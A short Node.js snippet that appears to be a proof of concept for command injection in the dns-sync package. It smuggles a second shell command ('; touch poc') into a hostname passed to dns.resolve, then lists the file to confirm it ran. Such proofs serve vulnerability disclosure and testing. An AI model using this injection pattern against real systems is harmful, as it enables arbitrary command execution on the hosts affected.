const { exec } = require('child_process');
const dns = require('dns-sync');

dns.resolve('hostname; touch poc');
exec('ls poc', (error, stdout, stderr) => {
    console.log(stdout);
});